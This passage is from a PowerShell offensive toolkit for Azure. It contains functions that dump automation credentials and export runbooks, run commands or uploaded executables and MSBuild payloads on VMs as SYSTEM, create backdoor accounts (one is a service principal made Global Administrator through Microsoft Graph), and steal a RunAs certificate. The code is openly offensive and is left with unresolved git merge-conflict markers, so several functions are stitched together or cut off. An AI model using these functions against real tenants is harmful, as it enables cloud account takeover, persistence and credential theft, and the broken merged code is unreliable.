#>
        [CmdletBinding()]
         Param(
        [Parameter(Mandatory=$false)][String]$AutomationAccount = $null,
        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)

     if($ResourceGroup -eq "")
     {
        Write-Host "Requires Resource Group name" -ForegroundColor Red
        Write-Host "Usage: Get-AutomationCredentials -AutomationAccount Test-Account -ResourceGroup Test_RG" -ForegroundColor Red
     }
     elseif($AutomationAccount -eq "")
     {
        Write-Host "Requires Automation Account name" -ForegroundColor Red
        Write-Host "Usage: Get-AutomationCredentials -AutomationAccount Test-Account -ResourceGroup Test_RG" -ForegroundColor Red
     }
     else
     {
        Get-AzAutomationCredential -AutomationAccountName $AutomationAccount -ResourceGroupName $ResourceGroup
     }

}

function Get-Runbooks
{
 <#
.SYNOPSIS
    Lists all the run books
#>
    $accounts = Get-AzAutomationAccount
=======
    [CmdletBinding()]
     Param(
    [Parameter(Mandatory=$false)][String]$Runbook = $null,
    [Parameter(Mandatory=$true)][String]$OutFilePath = $null,
    [Parameter(Mandatory=$false)][Switch]$All = $null)
>>>>>>> Stashed changes

    If($Runbook)
    {
        $Book = Get-AzAutomationAccount | Get-AzAutomationRunbook | Where-Object {$_.Name -eq $Runbook}
        Export-AzAutomationRunbook -ResourceGroupName $Book.ResourceGroupName -AutomationAccountName $Book.AutomationAccountName -Name $Runbook -OutputFolder $OutFilePath
    }
    If($All)
    {
        $Books = Get-AzAutomationAccount | Get-AzAutomationRunbook
        ForEach($Book in $Books)
        {
            Export-AzAutomationRunbook -ResourceGroupName $Book.ResourceGroupName -AutomationAccountName $Book.AutomationAccountName -Name $Book.Name
        }
    }
    If(!$All -and !$Runbook)
    {
      Write-Host "Usage:" -ForegroundColor Red  
      Write-Host "Get-AzureRunbookContent -Runbook Runbooktest -OutFilePath 'C:\temp'" -ForegroundColor Red  
      Write-Host "Get-AzureRunbookContent -All -OutFilePath 'C:\temp" -ForegroundColor Red  
    }
}

function Start-AzureRunbook
{
<#
.SYNOPSIS
    Starts a Runbook
.PARAMETER
    -Runbook (Name of runbook)
.EXAMPLE
    Start-AzureRunbook  -Runbook TestRunbook
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$true)][String]$Runbook = $null)

    $Book = Get-AzAutomationAccount | Get-AzAutomationRunbook | Where-Object {$_.Name -eq $Runbook}
    Start-AzAutomationRunbook -ResourceGroupName $Book.ResourceGroupName -AutomationAccountName $Book.AutomationAccountName -Name $Runbook   
}

function Invoke-AzureRunCommand
{
 <#
.SYNOPSIS
    Will run a command or script on a specified VM

.PARAMETER
    -Script 
    -Command 
    -VM

.EXAMPLE
    Invoke-AzureRunCommand -VM AzureWin10 -Command whoami
    Invoke-AzureRunCommand -VM AzureWin10 -Script 'C:\temp\test.ps1'
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$false)][String]$Script = $null,
    [Parameter(Mandatory=$false)][String]$Command = $null,
    [Parameter(Mandatory=$true)][String]$VMName = $null)

    if($VM)
    {
        $details = Get-AzVM -Name $VMName

        If($Command)
        {

            If($details.OSProfile.WindowsConfiguration)
            {
                $new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $Command -Force
                $path = $new.DirectoryName + '\' + $new.Name  
                $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
                $result.value.Message
                rm $path

            }
            If($details.OSProfile.LinuxConfiguration)
            {
                $new = New-Item -Name "LinuxDiagnosticTest.sh" -ItemType "file" -Value $Command
                $path = $new.DirectoryName + '\' + $new.Name  
                $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunShellScript' -ScriptPath $path
                $result.value.Message
                rm $path
            }            
        }
        If($Script)
        {
            If($details.OSProfile.WindowsConfiguration)
            {
                $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $Script
                $result.value.Message
            }
            If($details.OSProfile.LinuxConfiguration)
            {
                $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunShellScript' -ScriptPath $Script
                $result.value.Message
            }            
        }
        If(!$Script -and !$Command)
        {
          Write-Host "Usage:" -ForegroundColor Red
          Write-Host "Invoke-AzureRunCommand -VMName AzureWin10 -Command whoami"
          Write-Host "Invoke-AzureRunCommand -VMName AzureWin10 -Script 'C:\temp\test.ps1'"
        }
    }
}

<<<<<<< Updated upstream

function Execute-Program
=======
function Invoke-AzureRunProgram
>>>>>>> Stashed changes
{
 <#
.SYNOPSIS
    Will run a given binary on a specified VM

.PARAMETER
    -File (Provide full path)
    -VMName (Name of VM to run file on. Obviously must be Windows with .net installed)

.EXAMPLE
    Invoke-AzureRunProgram -VMName AzureWin10 -File C:\path\to\.exe"
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$true)][String]$File = $null,
    [Parameter(Mandatory=$true)][String]$VMName = $null)

    if($VMName -and $File -match '\\')
    {
        $details = Get-AzVM -Name $VMName
        If($details.OSProfile.WindowsConfiguration)
        {
            $ByteArray = [System.IO.File]::ReadAllBytes($File)
            $Base64String = [System.Convert]::ToBase64String($ByteArray) | Out-File temp.ps1 #This is necessary because raw output is too long for a command to be passed over az vm run-command invoke, so it must be in a script. 
            $upload = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath temp.ps1 -verbose
            $command = '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; $data = Get-Content C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\$name ;$Decode = [System.Convert]::FromBase64String($data);[System.IO.File]::WriteAllBytes("test.exe",$Decode);C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\test.exe'
            $new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $command -Force
            $path = $new.DirectoryName + '\' + $new.Name  
            $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
            $result.value.Message 
            rm $path           
        }

        If($details.OSProfile.LinuxConfiguration)
        {
            $result = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunShellScript' -ScriptPath $File
            $result.value.Message
        }       
    }
    elseif(!$VMName -or $File -notmatch '\\')
    { 
        Write-Host "-File must contain the full path to the file" -ForegroundColor Red
        Write-Host "Usage: Invoke-AzureRunProgram -VMName AzureWin10 -File C:\path\to\.exe" -ForegroundColor Red
    }    
}

function Invoke-AzureRunMSBuild
{
 <#
.SYNOPSIS
    Will run a supplied MSBuild payload on a specified VM. By default, Azure VMs have .NET 4.0 installed. Requires Contributor Role. Will run as SYSTEM.

.PARAMETER
    -File (MSBuild file or path to it. If in current directory do NOT use .\ )
    -VMName (Name of VM to run file on. Obviously must be Windows with .NET installed)

.EXAMPLE
    Invoke-AzureRunMSBuildd -VMName AzureWin10 -File 'C:/path/to/payload/onyourmachine.xml'
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$true)][String]$File = $null,
    [Parameter(Mandatory=$true)][String]$VMName = $null)

    $details = Get-AzVM -Name $VMName
    $upload = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $File -verbose
    If($upload.Value)
    {
        $command = '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; Start-Process C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\$name'
        $new = New-Item -Name "WindowsDiagnosticMSBuild.ps1" -ItemType "file" -Value $Command -Force
        $path = $new.DirectoryName + '\' + $new.Name  
        $run = Invoke-AzVMRunCommand -ResourceGroupName $details.ResourceGroupName -VMName $VMName -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
        $run.value.Message 
        rm $path
    }
}

function Invoke-AzureCommandRunbook
{
<#
.SYNOPSIS 
    Will execute a supplied command or script from a Runbook if the Runbook is configured with a "RunAs" account
	
.PARAMETER
    -AutomationAccount
	-ResourceGroup
	-VM
	-Command
	-Script
.EXAMPLE
    Invoke-AzureCommandRunbook -AutomationAccount TestAccount -VMName Win10Test -Command whoami
	Invoke-AzureCommandRunbook -AutomationAccount TestAccount -VMName Win10Test -Script "C:\temp\test.ps1"
#>
	[CmdletBinding()]
	Param(
	[Parameter(Mandatory=$True)][String]$AutomationAccount = $null,
	[Parameter(Mandatory=$True)][String]$VMName = $null,
	[Parameter(Mandatory=$false)][String]$Script = $null,
	[Parameter(Mandatory=$false)][String]$Command = $null)
	
	$OS = Get-AzVM -Name $VMName
    $AA = Get-AzAutomationAccount | Where-Object {$_.AutomationAccountName -eq "$AutomationAccount"}    
    $ResourceGroup = $AA.ResourceGroupName
    $VMResourceGroup = $OS.ResourceGroupName
    $Modules = Get-AzAutomationModule -ResourceGroupName $ResourceGroup -AutomationAccountName $automationaccount
    If($Modules.Name -notcontains 'AzureRM.Compute' -and $Modules.Name -notcontains 'AzureRM.profile')
    {
	New-AzAutomationModule -AutomationAccountName $AutomationAccount -Name "AzureRM.Compute" -ContentLink https://devopsgallerystorage.blob.core.windows.net:443/packages/azurerm.compute.5.9.1.nupkg -ResourceGroupName $ResourceGroup | Out-Null
    New-AzAutomationModule -AutomationAccountName $AutomationAccount -Name "AzureRM.Profile" -ContentLink https://devopsgallerystorage.blob.core.windows.net:443/packages/azurerm.profile.5.8.3.nupkg -ResourceGroupName $ResourceGroup | Out-Null
    }
	If($OS.OSProfile.WindowsConfiguration)
	{
		$data  = '$VMname = ' + '"' + $VMName + '"'| Out-File -Append AzureAutomationTutorialPowerShell.ps1
		$data1 = '$connectionName = "AzureRunAsConnection"' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
		$data2 = '$servicePrincipalConnection=Get-AutomationConnection -Name $connectionName' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
		$data3 = 'Add-AzureRmAccount -ServicePrincipal -TenantId $servicePrincipalConnection.TenantId -ApplicationId $servicePrincipalConnection.ApplicationId -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
		$data4 = 'New-Item C:\temp\test.ps1' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
		$data5 = "echo $Command >> C:\temp\test.ps1" | Out-File -Append AzureAutomationTutorialPowerShell.ps1
		$data6 = '$z = Invoke-AzureRmVMRunCommand -ResourceGroupName ' + $VMResourceGroup + ' -VMName ' + $VMName + ' -CommandId RunPowerShellScript -ScriptPath "C:\temp\test.ps1"' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
		$data7 = '$z.Value[0].Message' | Out-File -Append AzureAutomationTutorialPowerShell.ps1
		Write-Host "Uploading Runbook..." -ForegroundColor Green
		Import-AzAutomationRunbook -Path .\AzureAutomationTutorialPowerShell.ps1 -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell | Out-Null
		Write-Host "Publishing Runbook..." -ForegroundColor Green
		Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AzureAutomationTutorialPowerShell	| Out-Null
		Write-Host "Starting Runbook..." -ForegroundColor Green
		$start = Start-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AzureAutomationTutorialPowerShell	
		$jobid = $start.JobId
		$timer = [Diagnostics.Stopwatch]::StartNew()
		$value = $null
		$Timeout = 180
		While (!$value -and ($timer.Elapsed.TotalSeconds -lt $Timeout))
		{
			$ErrorActionPreference = "SilentlyContinue"
			Write-Host "Waiting for Runbook Output..." -ForegroundColor Green
			Start-Sleep -s 10
			$record = Get-AzAutomationJobOutput -ResourceGroupName $ResourceGroup -AutomationAccountName $AutomationAccount -Id $jobid -Stream Any | Get-AzAutomationJobOutputRecord
			$value = $record.Value[2].value

		}
		$timer.Stop()
		$value
		Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name AzureAutomationTutorialPowerShell -Force
		rm AzureAutomationTutorialPowerShell.ps1
	}
	else
	{
		$data  = '$VMname = ' + '"' + $VMName + '"'| Out-File -Append BashAutomationTutorial.sh
		$data1 = '$connectionName = "AzureRunAsConnection"' | Out-File -Append BashAutomationTutorial.sh
		$data2 = '$servicePrincipalConnection=Get-AutomationConnection -Name $connectionName' | Out-File -Append BashAutomationTutorial.sh
		$data3 = 'Add-AzureRmAccount ` -ServicePrincipal ` -TenantId $servicePrincipalConnection.TenantId ` -ApplicationId $servicePrincipalConnection.ApplicationId ` -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint' | Out-File -Append BashAutomationTutorial.sh
		$data4 = 'New-Item test.sh' | Out-File -Append BashAutomationTutorial.sh
		$data5 = "echo $Command >> test.sh" | Out-File -Append BashAutomationTutorial.sh
		$data6 = '$z = Invoke-AzureRmVMRunCommand -ResourceGroupName ' + $VMResourceGroup + ' -VMName ' + $VMName + ' -CommandId RunShellScript -ScriptPath "./test1.sh"' | Out-File -Append BashAutomationTutorial.sh
		$data7 = '$z.Value[0].Message' | Out-File -Append BashAutomationTutorial.sh
		Write-Host "Uploading Runbook..." -ForegroundColor Green
		Import-AzAutomationRunbook -Path .\BashAutomationTutorial.sh -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Type PowerShell
		Write-Host "Publishing Runbook..." -ForegroundColor Green
		Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name BashAutomationTutorial
		Write-Host "Starting Runbook..." -ForegroundColor Green
		$start = Start-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name BashAutomationTutorial	
		$jobid = $start.JobId
		$timer = [Diagnostics.Stopwatch]::StartNew()
		$value = $null
		$Timeout = 180
		While (!$value -and ($timer.Elapsed.TotalSeconds -lt $Timeout))
		{
			$ErrorActionPreference = "SilentlyContinue"
			Write-Host "Waiting for Runbook Output..." -ForegroundColor Green
			Start-Sleep -s 10
			$record = Get-AzAutomationJobOutput -ResourceGroupName $ResourceGroup -AutomationAccountName $AutomationAccount -Id $jobid -Stream Any | Get-AzAutomationJobOutputRecord
			$value = $record.Value[2].value

		}
		$value
		$timer.Stop()
		Remove-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $AutomationAccount -Name BashAutomationTutorial -Force
		rm BashAutomationTutorial.sh
	}
}

function Create-AzureBackdoor
{
 <#
.SYNOPSIS
    Creates a back door by creating a service principal and making it a Global Administrator.

.PARAMETER
<<<<<<< Updated upstream
    -Username (Username you used to login to Azure with, that has permissions to create a Runbook and user)
    -Password (Password to that account)
    -Account (Azure Automation Account name)
    -ResourceGroup (Resource Group)
    -NewUsername (Username you want to create)
    -NewPassword (Password for that new account)

.EXAMPLE
    Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -Group ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd 
#>
        [CmdletBinding()]
         Param(
        [Parameter(Mandatory=$false)][String]$Account = $null,
        [Parameter(Mandatory=$false)][String]$Username = $null,
        [Parameter(Mandatory=$false)][String]$Password = $null,
        [Parameter(Mandatory=$false)][String]$NewUsername = $null,
        [Parameter(Mandatory=$false)][String]$NewPassword = $null,
        [Parameter(Mandatory=$false)][String]$File = $null,
        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)
     if($ResourceGroup -eq "")
     {
        Write-Host "Requires Resource Group name" -ForegroundColor Red
        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
     }
     elseif($Account -eq "")
     {
        Write-Host "Requires an Automation Account name" -ForegroundColor Red
        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
     }
     elseif($Username -eq "")
     {
        Write-Host "Requires an Administrative username" -ForegroundColor Red
        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
     }
     elseif($Password -eq "")
     {
        Write-Host "Requires an Administrative password" -ForegroundColor Red
        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
     }
     elseif($NewUsername -eq "")
     {
        Write-Host "Requires a new username" -ForegroundColor Red
        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
     }
     elseif($NewPassword -eq "")
     {
        Write-Host "Requires a new password." -ForegroundColor Red
        Write-Host "Usage: Create-Backdoor -Username Administrator@contoso.com -Password Password! -Account AutomationAccountExample -ResourceGroup ResourceGroupName -NewUsername Test01@contoso.com -NewPassword Passw0rd" -ForegroundColor Red
     }
     else
     {
            $date = (Get-Date).AddDays(7)
            $formatted = $date.ToString("MM/dd/yyyy")
            if($File)
            {
                Import-AzAutomationRunbook -Path .\$File -ResourceGroup $ResourceGroup -AutomationAccountName $Account -Type PowerShell
            }
            else
            {
                $SplitName=$NewUsername -split "@"
                $DisplayName = $SplitName[0]
            
            
                $data = "az login -u $Username -p $Password" | Out-File AzureAutomationTutorialPowerShell.ps1
                $data2 = "az ad user create --display-name $DisplayName --password $NewPassword --user-principal-name $NewUsername" | Out-File -Append AzureAutomationTutorialPowerShell.ps1
                $data4 = "az role assignment create --assignee $NewUPN --role Contributor" | Out-File -Append AzureAutomationTutorialPowerShell.ps1
                Import-AzAutomationRunbook -Path .\AzureAutomationTutorialPowerShell.ps1 -ResourceGroup $ResourceGroup -AutomationAccountName $Account -Type PowerShell
                Publish-AzAutomationRunbook -ResourceGroup $ResourceGroup -AutomationAccountName $Account -Name AzureAutomationTutorialPowerShell
                Write-Host ""
                Write-Host "--------------------"
                Write-Host "COPY THE URI BELOW, IT IS NOT RETRIEVABLE. PASS IT INTO Execute-BackDoor TO RUN IT"
                New-AzAutomationWebhook -Name "AzureAutomationTutorialPowerShell" -ResourceGroup $ResourceGroup -AutomationAccountName $Account -RunbookName "AzureAutomationTutorialPowerShell" -Force -IsEnabled $True -ExpiryTime $formatted
                rm AzureAutomationTutorialPowerShell.ps1
            }
        }
}

function Execute-Backdoor
{
 <#
.SYNOPSIS
    This runs the backdoor that is created with "Create-Backdoor
=======
    -Password (What the password will be for the service principal.)

.EXAMPLE
    Create-AzureBackdoor -Username 'testserviceprincipal' -Password 'Password!'
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$true)][String]$Username = $null,
    [Parameter(Mandatory=$true)][String]$Password = $null)

    Import-Module Az.Resources
    $Headers = Get-AzureGraphToken
    $credentials = New-Object -TypeName Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential -Property @{
    StartDate=Get-Date; EndDate=Get-Date -Year 2024; Password=$Password}
    $make = New-AzADServicePrincipal -DisplayName $Username -PasswordCredential $credentials
    $UserId = $make.Id
	$uri = 'https://graph.microsoft.com/v1.0/directoryRoles/4dda258a-4568-4579-abeb-07709e34e307/members/$ref'
$body = @"
{	"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$UserId"
}
"@
	$req = Invoke-RestMethod -Headers $Headers -Method Post -Body $body -ContentType 'application/json' -Uri $uri | Convertto-Json
>>>>>>> Stashed changes

}

function Get-AzureTargets
{
<#
.SYNOPSIS 
    Checks your role against the scope of your role to determine what you have access to. 
#>

$UID = az ad signed-in-user show --query 'userPrincipalName' -o tsv
$assignments = az role assignment list --all --query "[?principalName=='$UID'].{Scope:scope,Role:roleDefinitionName}" | ConvertFrom-Json

	ForEach ($assignment in $assignments)
		{
			$role = az role assignment list --all --query "[?principalName=='$UID'].{Role:roleDefinitionName}" -o tsv
			Write-Host "Role:" $role -ForegroundColor Green
			Write-Host "Scope:" $assignment.Scope -ForegroundColor Green
			Write-host ""
			$sub = az account list | ConvertFrom-Json
			$subid = $sub.id
			$rglist =  az group list | ConvertFrom-Json
			$permissions= az role definition list --name $role | ConvertFrom-Json
			$actions = $permissions.permissions.actions
			ForEach ($action in $actions)
			{
				$paths = $action.Split("/")
				If ($paths.count -eq 1)
				{
					$rt = $paths[0]
					If ($rt -eq '*')
					{
						$result = az resource list --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
						If ($result.length -gt 1)
						{
							Write-Host "You have Read/Write/Execute permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result		
							Write-host ""							
						}
					}
					elseif ($rt -eq 'write')
					{
						$result = az resource list --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" | ConvertFrom-Json
						If ($result.length -gt 1)
						{
							Write-Host "You have Write permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result	
							Write-host ""							
						}
					}
					elseif ($rt -eq 'read')
					{
						$result = az resource list --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" | ConvertFrom-Json
						If ($result.length -gt 1)
						{
							Write-Host "You have Read permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result		
							Write-host ""							
						}
					}
					elseif ($rt -eq 'action')
					{
						$result = az resource list --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" | ConvertFrom-Json
						If ($result.length -gt 1)
						{
							Write-Host "You have Execute permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result	
							Write-host ""							
						}
					}			
				}				
				If ($paths.count -eq 3)
				{
					$rt = $paths[0] + "/" + $paths[1]
					$last = $action.Split("/") | select -last 1
					
					if ($last -eq '*')
					{
						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
						If ($result.length -gt 0)
						{
							Write-Host "You have Read/Write/Execute permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result
							Write-host ""							
						}
					}
					elseif ($last -eq 'write')
					{
						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
						If ($result.length -gt 0)
						{
							Write-Host "You have Write permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result		
							Write-host ""							
						}
					}
					elseif ($last -eq 'read')
					{
						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
						If ($result.length -gt 0)
						{
							Write-Host "You have Read permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result	
							Write-host ""							
						}
					}
					elseif ($last -eq 'action')
					{
						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
						If ($result.length -gt 0)
						{
							Write-Host "You have Execute permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result	
							Write-host ""							
						}
					}			
				}			
				If ($paths.count -eq 4)
				{
					$rt = $paths[0] + "/" + $paths[1] + "/" + $paths[2]
					$last = $action.Split("/") | select -last 1
					If ($last -eq '*')
					{
						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
						If ($result.length -gt 0)
						{
							Write-Host "You have Read/Write/Execute permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result		
							Write-host ""							
						}
					}
					elseif ($last -eq 'write')
					{
						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
						If ($result.length -gt 0)
						{
							Write-Host "You have Write permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result	
							Write-host ""							
						}
					}
					elseif ($last -eq 'read')
					{
						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
						If ($result.length -gt 0)
						{
							Write-Host "You have Read permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result		
							Write-host ""							
						}
					}
					elseif ($last -eq 'action')
					{
						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
						If ($result.length -gt 0)
						{
							Write-Host "You have Execute permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result	
							Write-host ""							
						}
					}			
				}		
				If ($paths.count -eq 5)
				{
					$rt = $paths[0] + "/" + $paths[1] + "/" + $paths[2] + "/" + $paths[3]
					$last = $action.Split("/") | select -last 1
					If ($last -eq '*')
					{
						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
						If ($result.length -gt 0)
						{
							Write-Host "You have Read/Write/Execute permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result	
							Write-host ""							
						}
					}
					elseif ($last -eq 'write')
					{
						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
						If ($result.length -gt 0)
						{
							Write-Host "You have Write permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result	
							Write-host ""							
						}
					}
					elseif ($last -eq 'read')
					{
						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
						If ($result.length -gt 0)
						{
							Write-Host "You have Read permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result		
							Write-host ""							
						}
					}
					elseif ($last -eq 'action')
					{
						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
						If ($result.length -gt 0)
						{
							Write-Host "You have Execute permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result	
							Write-host ""							
						}
					}			
				}
				If ($paths.count -eq 6)
				{
					$rt = $paths[0] + "/" + $paths[1] + "/" + $paths[2] + "/" + $paths[3] + "/" + $paths[4]
					$last = $action.Split("/") | select -last 1
					If ($last -eq '*')
					{
						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
						If ($result.length -gt 0)
						{
							Write-Host "You have Read/Write/Execute permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result				
						}
					}
					elseif ($last -eq 'write')
					{
						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
						If ($result.length -gt 0)
						{
							Write-Host "You have Write permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result				
						}
					}
					elseif ($last -eq 'read')
					{
						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
						If ($result.length -gt 0)
						{
							Write-Host "You have Read permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result				
						}
					}
					elseif ($last -eq 'action')
					{
						$result = az resource list --resource-type "$rt" --query "[].{Name:name,Type:type,ResourceGroup:resourceGroup}" -o table
						If ($result.length -gt 0)
						{
							Write-Host "You have Execute permissions on the following resources:" -ForegroundColor Green
							Write-host ""
							$result				
						}
					}			
				}
			}
		}
}
<<<<<<< Updated upstream

=======

function Get-AzureRolePermission
{
<#
.SYNOPSIS 
    Finds all roles with a certain permission
	
.PARAMETER
    -Permission

.EXAMPLE
    Get-AzureRolePermission -Permission 'virtualMachines/*'
#>
	[CmdletBinding()]
	 Param(
	[Parameter(Mandatory=$true)][String]$Permission = $null)

	$roles= Get-AzRoleDefinition
	ForEach($role in $roles)
	{
		If($role.roleType -eq "BuiltInRole")
		{
			$rolename = $role.roleName 
			if ($role.permissions.actions -match "$Permission")
			{		
				$role
			}
		}
	}
}

function Get-AzureRunAsCertificate
{
<#
.SYNOPSIS 
    Will gather a RunAs accounts certificate if one is being used by an automation account, which can then be used to login as that account. By default, RunAs accounts are contributors over the subscription. This function does take a minute to run.
	
.PARAMETER
    -AutomationAccount

.EXAMPLE
    Get-AzureRunAsCertificate -ResourceGroup Test_RG -AutomationAccount TestAccount
#>

	[CmdletBinding()]
	 Param(
	[Parameter(Mandatory=$true)][String]$AutomationAccount = $null)
    
    $CurrentUser = Get-AzContext
    $AA = Get-AzAutomationAccount | Where-Object {$_.AutomationAccountName -eq "$AutomationAccount"}   
    $name = $AA.AutomationAccountName
    $AppData = Get-AzADApplication | Where-Object {$_.DisplayName -match "$name"}
    $ResourceGroup = $AA.ResourceGroupName
	$data1 = '$RunAsCert = Get-AutomationCertificate -Name "AzureRunAsCertificate"' | Out-File  AutomationTutorialPowerShell.ps1 -Force
	$data2 = '$CertPath = Join-Path $env:temp  "AzureRunAsCertificate.pfx"' | Out-File -Append AutomationTutorialPowerShell.ps1
	$data3 = '$Cert = $RunAsCert.Export("pfx",$Password)' | Out-File -Append AutomationTutorialPowerShell.ps1
	$data4 = '$Password = "YourStrongPasswordForTheCert" ' | Out-File -Append AutomationTutorialPowerShell.ps1
	$data5 = 'Set-Content -Value $Cert -Path $CertPath -Force -Encoding Byte | Write-Verbose' | Out-File -Append AutomationTutorialPowerShell.ps1
    $data6 = '$RunAsCert' | Out-File -Append AutomationTutorialPowerShell.ps1
	$data6 = '[Convert]::ToBase64String([IO.File]::ReadAllBytes($CertPath))' | Out-File -Append AutomationTutorialPowerShell.ps1
	Write-Host "Uploading Runbook..." -ForegroundColor Green
